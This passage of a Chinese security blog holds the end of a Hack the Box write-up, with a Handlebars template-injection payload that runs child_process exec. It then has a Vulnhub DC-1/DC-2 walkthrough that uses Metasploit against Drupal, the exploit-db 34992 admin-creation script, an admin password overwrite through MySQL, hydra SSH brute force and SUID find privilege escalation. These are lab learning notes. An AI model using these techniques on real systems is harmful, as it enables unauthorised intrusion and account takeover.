class="name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">with</span></span> string.split <span class="keyword">as</span> |codelist|&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> <span class="string">&quot;return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);&quot;</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">each</span></span> conslist&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">          </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">with</span></span> (<span class="name">string.sub.apply</span> <span class="number">0</span> codelist)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">            </span><span class="template-variable">&#123;&#123;<span class="name">this</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">          </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">each</span></span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">with</span></span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>关键代码为</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">this.push</span> <span class="string">&quot;return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);&quot;</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><p>这是关键，因为只有对特殊字符编码后，网站才能正常识别</p>
<h3 id="修改payload"><a href="#修改payload" class="headerlink" title="修改payload"></a>修改payload</h3><p>如果直接使用这个模板payload会发生报错</p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h5 id="Process-MainModule-属性"><a href="#Process-MainModule-属性" class="headerlink" title="Process.MainModule 属性"></a>Process.MainModule 属性</h5><blockquote>
<p><code>获取关联进程的主模块</code></p>
</blockquote>
<h5 id="child-process模块"><a href="#child-process模块" class="headerlink" title="child_process模块"></a>child_process模块</h5><blockquote>
<p><a href="http://nodejs.org/api/child_process.html"><code>child_process</code>模块</a>充当 <a href="http://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options"><code>spawn</code></a>、<a href="http://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback"><code>exec、execFile</code></a> 和 <a href="http://nodejs.org/api/child_process.html#child_process_child_process_fork_modulepath_args_options"><code>fork</code></a> 函数的命名空间。 </p>
<p>调用以引用模块，然后调用其成员函数之一以创建新进程。</p>
<p><code>就是在当前主进程开一个子进程用于shell命令执行</code></p>
</blockquote>
<h1 id="第2层"><a href="#第2层" class="headerlink" title="第2层"></a>第2层</h1>]]></content>
      <categories>
        <category>Hack the Box</category>
      </categories>
      <tags>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub靶场学习笔记</title>
    <url>/vulnhub/</url>
    <content><![CDATA[<p><u><code>学习一下实战靶场，做一下笔记</code></u></p>
<p><code>实战环境，</code></p>
<p><code>信息收集的能力决定了能否渗透成功，以及自己会浪费自己多少时间</code></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>官网下载地址</p>
<blockquote>
<p><a href="http://www.vulnhub.com/">http://www.vulnhub.com/</a></p>
</blockquote>
<p>这里提一下靶场机<code>ip</code>怎么看</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span> </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220829153949360.png"><img src="/vulnhub/image-20220829153949360.png" alt="image-20220829153949360"></a></p>
<blockquote>
<p><code>nmap -sP  192.168.133.134/24</code><br>&#x2F;&#x2F;192.168.133.134是虚拟机ip</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220829154027029.png"><img src="/vulnhub/image-20220829154027029.png" alt="image-20220829154027029"></a></p>
<p>找到靶机<code>ip</code></p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p>习惯性用<code>nmap</code>扫一下它端口</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220829154322453.png"><img src="/vulnhub/image-20220829154322453.png" alt="image-20220829154322453"></a></p>
<hr>
<h1 id="DC系列【1-9】-完"><a href="#DC系列【1-9】-完" class="headerlink" title="DC系列【1~9】(完)"></a>DC系列【1~9】(完)</h1><h1 id="一、DC-1-初级"><a href="#一、DC-1-初级" class="headerlink" title="一、DC-1[初级]"></a>一、DC-1[初级]</h1><p><strong>five flags</strong></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>浏览器访问靶机<code>ip</code></p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p>这是开始界面</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220829154626618.png"><img src="/vulnhub/image-20220829154626618.png" alt="image-20220829154626618"></a></p>
<p>这里介绍一个插件<code>Wappalyzer</code>，它能够获取网页自身的框架和编写的语言，这样就不用查看网络返回包来分析了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830094043837.png"><img src="/vulnhub/image-20220830094043837.png" alt="image-20220830094043837"></a></p>
<p>可以看到网站是用<code>php</code>语言编写的，<code>CMS</code>是<code>Drupal</code></p>
<hr>
<h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>先用<code>msf</code>看看有没有<code>drupal</code>相应的攻击脚本</p>
<blockquote>
<p>终端输入<code>msfconsole</code>，进入<code>msf</code>界面，或者菜单也可以打开</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830094506049.png"><img src="/vulnhub/image-20220830094506049.png" alt="image-20220830094506049"></a></p>
<blockquote>
<p>输入<code>search drupal</code>，找一下有没有drupal可以利用的脚本<br><em>对于其他命令，可以用help查询</em></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830094939297.png"><img src="/vulnhub/image-20220830094939297.png" alt="image-20220830094939297"></a></p>
<p>这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以</p>
<blockquote>
<p>输入<code>use 1</code>，进入编号1脚本的运行环境</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830095106784.png"><img src="/vulnhub/image-20220830095106784.png" alt="image-20220830095106784"></a></p>
<blockquote>
<p>输入<code>show options</code>,查看脚本运行的所需要配置的项目</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830105519336.png"><img src="/vulnhub/image-20220830105519336.png" alt="image-20220830105519336"></a></p>
<blockquote>
<p><code>Required</code>是要求填的，<code>yes</code>是必填项，<code>no</code>是非必填项</p>
</blockquote>
<p>这里的<code>RHOSTS</code>没有填，这里是要求填入<code>target hosts</code>也就是目标地址，也就是我们靶机的地址</p>
<blockquote>
<p>输入<code>set RHOSTS 192.168.133.136</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110143969.png"><img src="/vulnhub/image-20220830110143969.png" alt="image-20220830110143969"></a></p>
<blockquote>
<p>再输入<code>run</code>，运行脚本</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110303594.png"><img src="/vulnhub/image-20220830110303594.png" alt="image-20220830110303594"></a></p>
<blockquote>
<p>输入<code>shell</code>，进入<code>shell</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110551273.png"><img src="/vulnhub/image-20220830110551273.png" alt="image-20220830110551273"></a></p>
<blockquote>
<p>输入<code>whoami</code>，查看当前的权限</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110648417.png"><img src="/vulnhub/image-20220830110648417.png" alt="image-20220830110648417"></a></p>
<p>发现是个低权限的账号</p>
<blockquote>
<p>输入<code>ls</code>，可以查看到当前的目录文件</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110825217.png"><img src="/vulnhub/image-20220830110825217.png" alt="image-20220830110825217"></a></p>
<p>但是一堆东西挤在一起，还是有些不太方便</p>
<h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="*交互式shell"></a><code>*交互式shell</code></h3><p><strong>输入下方指令，利用python进入交互式shell【固定姿势，要记住】</strong></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830110907408.png"><img src="/vulnhub/image-20220830110907408.png" alt="image-20220830110907408"></a></p>
<blockquote>
<p>输入<code>ls</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830142759540.png"><img src="/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></a></p>
<p>发现<code>flag1.txt</code></p>
<blockquote>
<p>输入<code>cat flag1.txt</code>查看</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830142915555.png"><img src="/vulnhub/image-20220830142915555.png" alt="image-20220830142915555"></a></p>
<blockquote>
<p><code>Every good CMS needs a config file - and so do you.</code><br>意思是：一个好的CMS（内容管理系统）需要一个config file（配置文件）</p>
<p>也就是我们需要看看它的配置文件，这是Flag2的线索</p>
</blockquote>
<h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>在目录下我们发现有个<code>sites</code>目录，也就是站点目录，里面很有可能有配置文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830142759540.png"><img src="/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></a></p>
<blockquote>
<p>输入<code>cd sites;ls -a</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830143404972.png"><img src="/vulnhub/image-20220830143404972.png" alt="image-20220830143404972"></a></p>
<p>有个<code>default</code>（默认）目录，查看一下</p>
<blockquote>
<p>输入<code>cd default;ls -a</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830143517235.png"><img src="/vulnhub/image-20220830143517235.png" alt="image-20220830143517235"></a></p>
<p>看到<code>setting.php</code>也就差不多是<code>config file</code></p>
<blockquote>
<p>输入<code>cat setting.php</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830143752469.png"><img src="/vulnhub/image-20220830143752469.png" alt="image-20220830143752469"></a></p>
<p>得到<code>Flag2</code></p>
<blockquote>
<ul>
<li><p><code>flag2</code></p>
</li>
<li><p><code>Brute force and dictionary attacks aren&#39;t the</code></p>
</li>
<li><p><code>only ways to gain access (and you WILL need access).</code></p>
</li>
<li><p><code>What can you do with these credentials?</code></p>
<p> 意思是：暴力和字典攻击不是获得访问权限的唯一方法（您将需要访问权限）。<br> 你能用这些证书做什么？</p>
</li>
</ul>
<p>就是说不要局限于爆破密码来登录admin用户，你拥有了数据库这些信息，你可以做什么</p>
</blockquote>
<hr>
<h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>关键分析这里，这是靶机数据库的用户名和密码的信息，</p>
<p>有了这个我们就可以进入靶机的数据库，对里面的数据库进行修改或增添</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span> (</span><br><span class="line">     <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   )</span><br></pre></td></tr></table></figure>

<h3 id="1）mysql数据库修改admin用户的密码（或者新建一个用户密码）"><a href="#1）mysql数据库修改admin用户的密码（或者新建一个用户密码）" class="headerlink" title="1）mysql数据库修改admin用户的密码（或者新建一个用户密码）"></a>1）mysql数据库修改admin用户的密码（或者新建一个用户密码）</h3><blockquote>
<p>输入<code>mysql -udbuser -pR0ck3t</code></p>
<p>*注意这里-u和-p后面没有空格，有空格会报错</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830151236620.png"><img src="/vulnhub/image-20220830151236620.png" alt="image-20220830151236620"></a></p>
<p>先看看数据库</p>
<blockquote>
<p>输入<code>show databases;</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830151531028.png"><img src="/vulnhub/image-20220830151531028.png" alt="image-20220830151531028"></a></p>
<p>查看<code>drupaldb</code>库里的表</p>
<blockquote>
<p>输入<code>use drupaldb;</code><br>然后输入<code>show tables;</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830151716900.png"><img src="/vulnhub/image-20220830151716900.png" alt="image-20220830151716900"></a></p>
<p>看到<code>users</code>表，这就是我们登录成功的关键，查看该表</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830151829478.png"><img src="/vulnhub/image-20220830151829478.png" alt="image-20220830151829478"></a></p>
<p>发现有两个用户，我们的目的是修改或者获得admin用户的密码，当然也可以再创建一个用户，但是都需要加密</p>
<blockquote>
<p>因为这里我们可以发现用户的密码是被加密了的，那加密文件肯定是在脚本目录里，也就是scripts目录里，利用加密脚本，把我们的密码加密，然后更新数据库里admin用户原本的密码</p>
</blockquote>
<p>我们来找找密码加密脚本在哪里</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830142759540.png"><img src="/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></a></p>
<p>看到<code>scripts</code>目录</p>
<p>进入查看</p>
<blockquote>
<p>输入<code>cd scripts;ls -a</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830152428416.png"><img src="/vulnhub/image-20220830152428416.png" alt="image-20220830152428416"></a></p>
<p>发现有一个<code>password-hash.sh</code>文件，密码就是通过它进行hash加密的</p>
<p>运行它，让它把我们的密码加密</p>
<blockquote>
<p>输入<code>./password-hash.sh  123456</code></p>
</blockquote>
<hr>
<p>但是运行可能会出现如下错误，如果没有请忽略</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830152851541.png"><img src="/vulnhub/image-20220830152851541.png" alt="image-20220830152851541"></a></p>
<p>报错说</p>
<blockquote>
<p><code>include_once(/var/www/scripts/includes/password.inc): failed to open stream: No such file or directory</code> </p>
</blockquote>
<p>也就是找不到该文件，但是发现，includes目录确实也不在scripts目录下，于是用cp把<code>includes</code>目录放到<code>scripts</code>目录下即可</p>
<blockquote>
<p>输入<code>cp -r ../includes ./</code></p>
</blockquote>
<hr>
<p>得到加密数据</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830153417077.png"><img src="/vulnhub/image-20220830153417077.png" alt="image-20220830153417077"></a></p>
<p>再次进入<code>mysql</code>数据库，修改 <code>admin</code>密码</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">update<span class="built_in"> users </span><span class="built_in">set</span> <span class="attribute">pass</span>=<span class="string">&quot;<span class="variable">$S</span><span class="variable">$D9wpmqJmKcXIUSGVEY2utFL8LBiwX18pbpLhBZifD9gXThGAwz4x</span>&quot;</span> where <span class="attribute">name</span>=<span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830161703412.png"><img src="/vulnhub/image-20220830161703412.png" alt="image-20220830161703412"></a></p>
<p>我们试试能不能登录</p>
<blockquote>
<p>用户名：<code>admin</code></p>
<p>密码：<code>123456</code></p>
</blockquote>
<p>登录成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830161808584.png"><img src="/vulnhub/image-20220830161808584.png" alt="image-20220830161808584"></a></p>
<p>得到flag3</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830161837967.png"><img src="/vulnhub/image-20220830161837967.png" alt="image-20220830161837967"></a></p>
<h3 id="2）利用drupal脚本添加管理员用户"><a href="#2）利用drupal脚本添加管理员用户" class="headerlink" title="2）利用drupal脚本添加管理员用户"></a>2）利用drupal脚本添加管理员用户</h3><p>优点是更加方便，快捷，<strong>但是脚本不是万能的，只有自己明白原理才是真正掌握</strong>，这个的本质也是利用<code>sql</code>注入</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.exploit-db.com<span class="regexp">/exploits/</span><span class="number">34992</span></span><br></pre></td></tr></table></figure>

<p>该网站在kali里面浏览器书签自带的，这个脚本适用于drupal，直接下载下来用即可</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830145453216.png"><img src="/vulnhub/image-20220830145453216.png" alt="image-20220830145453216"></a></p>
<p>下载好后，运行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python2</span> <span class="number">34992</span>.py -t http://<span class="number">192.168.133.136</span> -u admin001 -p <span class="number">123456</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>-t就是目标网站，-u就是新建的用户名，-p就是用户名密码<br>*注意这个脚本需要 python2运行，python3语法不符合</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830145642143.png"><img src="/vulnhub/image-20220830145642143.png" alt="image-20220830145642143"></a></p>
<p>然后按照输入的，直接登录就可以了，或者直接点击下面链接</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830153620620.png"><img src="/vulnhub/image-20220830153620620.png" alt="image-20220830153620620"></a></p>
<p>就可以拿到<code>Flag3</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830154431807.png"><img src="/vulnhub/image-20220830154431807.png" alt="image-20220830154431807"></a></p>
<hr>
<h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2><h3 id="1）个人方法"><a href="#1）个人方法" class="headerlink" title="1）个人方法"></a>1）个人方法</h3><p>分析一下<code>flag3</code></p>
<blockquote>
<p><code>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</code></p>
<p>意思是：Special PERMS特别的权限（应该是root权限），passwd应该是查看&#x2F;etc&#x2F;passwd目录，FIND意思利用find命令，-exec就是需要用它执行命令， get what’s in the shadow意思是flag4在&#x2F;etc&#x2F;shadow里</p>
</blockquote>
<p>我们先看看<code>etc</code>目录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830163045108.png"><img src="/vulnhub/image-20220830163045108.png" alt="image-20220830163045108"></a></p>
<p>发现了<code>passwd</code>文件</p>
<blockquote>
<p>输入<code>cat passwd</code></p>
</blockquote>
<p>查看一下内容</p>
<p>发现有<code>flag4</code>的线索</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830163220380.png"><img src="/vulnhub/image-20220830163220380.png" alt="image-20220830163220380"></a></p>
<p><code>flag4</code>是在<code>/home/flag4</code>里面，我们到目录里看看</p>
<blockquote>
<p>输入<code>cd /home/flag4</code></p>
</blockquote>
<p>发现有个<code>flag4.txt</code>，查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830163358828.png"><img src="/vulnhub/image-20220830163358828.png" alt="image-20220830163358828"></a></p>
<p>得到<code>flag4</code></p>
<h3 id="2）官方方法"><a href="#2）官方方法" class="headerlink" title="2）官方方法"></a>2）官方方法</h3><p>用了<code>hydra</code>[九头蛇]工具，对我们在<code>passwd</code>里看到<code>flag4</code>用户进行爆破</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -<span class="selector-tag">p</span> /usr/share/wordlists/rockyou<span class="selector-class">.txt</span><span class="selector-class">.gz</span> <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br></pre></td></tr></table></figure>

<blockquote>
<p>-l是指定用户或指定包含多个用户的文件，-p是指定密码或指定包含多个密码的文件，ssh就是<br>用户所在的网站</p>
<p>上面-p的文件是自己下载的密码包</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830211739164.png"><img src="/vulnhub/image-20220830211739164.png" alt="image-20220830211739164"></a></p>
<p>这里就看到<code>flag4</code>用户的密码被爆破出来，是<code>orange</code></p>
<p>然后用<code>ssh</code>连接</p>
<blockquote>
<p>输入<code>ssh flag4@192.168.133.136</code><br>然后yes<br>然后输入密码：<code>orange</code></p>
</blockquote>
<p>进入<code>flag4</code>用户页面，</p>
<blockquote>
<p>输入<code>cat flag4.txt</code><br>得到flag4</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830211817515.png"><img src="/vulnhub/image-20220830211817515.png" alt="image-20220830211817515"></a></p>
<hr>
<h2 id="Flag5"><a href="#Flag5" class="headerlink" title="Flag5"></a>Flag5</h2><blockquote>
<p>分析一下flag5<br><code>Can you use this same method to find or access the flag in root?</code></p>
<p><code>Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code></p>
<p>意思是：您可以使用相同的方法查找或访问根目录中的标志吗？</p>
<p>可能但也许这并不容易。也许是这样？</p>
</blockquote>
<p><code>root</code>应该就是需要提权了</p>
<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p><code>linux</code>提权操作可以看一下我的<code>WEB随笔</code>里<code>suid</code>提权，下面只记录流程</p>
<blockquote>
<p>输入<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，查看目录下suid权限所有可执行二进制文件</p>
</blockquote>
<p>发现<code>find</code>目录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830162407934.png"><img src="/vulnhub/image-20220830162407934.png" alt="image-20220830162407934"></a></p>
<p>于是可以利用<code>find</code>获取<code>root</code>权限<code>shell</code></p>
<p>主要是要让<code>find</code>命令成功执行，找一个存在的文件即可</p>
<blockquote>
<p>以在根目录为例<br>输入<code>find / -name initrd.img -exec &quot;/bin/sh&quot; \;</code></p>
</blockquote>
<p>提权成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830164525214.png"><img src="/vulnhub/image-20220830164525214.png" alt="image-20220830164525214"></a></p>
<p>我们在<code>flag4</code>里知道，最后的旗子在<code>root</code>目录里</p>
<blockquote>
<p>输入<code>cd /root;ls -a</code></p>
</blockquote>
<p>发现<code>thefinalflag.txt</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830164848589.png"><img src="/vulnhub/image-20220830164848589.png" alt="image-20220830164848589"></a></p>
<blockquote>
<p><code>Well done!!!!</code></p>
<p><code>Hopefully you&#39;ve enjoyed this and learned some new skills.</code></p>
<p><code>You can let me know what you thought of this little journey</code><br><code>by contacting me via Twitter - @DCAU7</code><br>意思是：<br>做得好！！！！</p>
<p>希望你喜欢这一点，并学习了一些新技能。</p>
<p>你可以告诉我你对这次小旅行的看法<br>通过Twitter联系我-@DCAU7 </p>
</blockquote>
<p><strong>5个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="二、DC-2-初级"><a href="#二、DC-2-初级" class="headerlink" title="二、DC-2[初级]"></a>二、DC-2[初级]</h1><p><strong>five flags</strong></p>
<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p> 先用<code>nmap</code>扫描一些</p>
<blockquote>
<p>输入<code>nmap -p- 192.168.133.138</code></p>
</blockquote>
<p>发现内容太少了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831205238565.png"><img src="/vulnhub/image-20220831205238565.png" alt="image-20220831205238565"></a></p>
<blockquote>
<p>输入<code>nmap -p- 192.168.133.138 -A</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831205550715.png"><img src="/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></a></p>
<p>发现<code>7744</code>端口运行的<code>ssh</code>，<code>22</code>端口被换了</p>
<blockquote>
<p>Ssh是一个安全的远程登录协议,它的端口号默认是22端口</p>
</blockquote>
<blockquote>
<p>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。</p>
</blockquote>
<p>我们试试访问我们的靶机<code>ip</code>：<code>192.168.133.138</code></p>
<hr>
<p>但是访问失败【如果没有问题，可以忽略】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831210742250.png"><img src="/vulnhub/image-20220831210742250.png" alt="image-20220831210742250"></a></p>
<p>可以看到，访问<code>IP</code>的时候进行了一个跳转，跳转到了<code>http://dc-2</code>，且无法访问</p>
<p>我猜测是<code>hosts</code>文件没有修改，所以域名无法登录</p>
<p>需要在<code>hosts</code>其中添加域名：<code>http://dc-2</code>和其ip：<code>192.168.133.138</code>，<code>dns</code>才能正常转换</p>
<blockquote>
<p>输入<code>vi /etc/hosts</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831211542540.png"><img src="/vulnhub/image-20220831211542540.png" alt="image-20220831211542540"></a></p>
<p>向其中添加</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.138</span> dc-<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831212553718.png"><img src="/vulnhub/image-20220831212553718.png" alt="image-20220831212553718"></a></p>
<p>刷新浏览器，再次访问<code>192.168.133.138</code>或<code>http://dc-2</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831212746196.png"><img src="/vulnhub/image-20220831212746196.png" alt="image-20220831212746196"></a></p>
<p>成功连接</p>
<hr>
<h2 id="Flag1-1"><a href="#Flag1-1" class="headerlink" title="Flag1"></a>Flag1</h2><p>进入网页就看到<code>flag</code>了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831212936534.png"><img src="/vulnhub/image-20220831212936534.png" alt="image-20220831212936534"></a></p>
<p>点击打开查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831213114724.png"><img src="/vulnhub/image-20220831213114724.png" alt="image-20220831213114724"></a></p>
<blockquote>
<p><code>Flag 1:</code></p>
<p><code>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</code></p>
<p><code>More passwords is always better, but sometimes you just can’t win them all.</code></p>
<p><code>Log in as one to see the next flag.</code></p>
<p><code>If you can’t find it, log in as another.</code></p>
<p>意思是：<br>你通常的密码表可能不起作用，因此，也许你只需要成为cewl。</p>
<p>密码越多越好，但有时你无法赢得所有密码。</p>
<p>作为一个登录以查看下一个标志。</p>
<p>如果找不到，请作为另一个登录</p>
<p>·Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。</p>
<p>那我们就用cewl工具试一下<br>*不会工具一般用-h就可以知道使用说明</p>
</blockquote>
<hr>
<h2 id="Flag2-1"><a href="#Flag2-1" class="headerlink" title="Flag2"></a>Flag2</h2><p>根据<code>flag1</code>，我们用<code>cewl</code>试试生成字典</p>
<h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><blockquote>
<p>输入<code>cewl http://dc-2/ &gt;pass.txt</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831221031390.png"><img src="/vulnhub/image-20220831221031390.png" alt="image-20220831221031390"></a></p>
<p>目录下就会生成<code>pass.txt</code></p>
<blockquote>
<p>输入<code>cat pass.txt</code>，查看内容</p>
</blockquote>
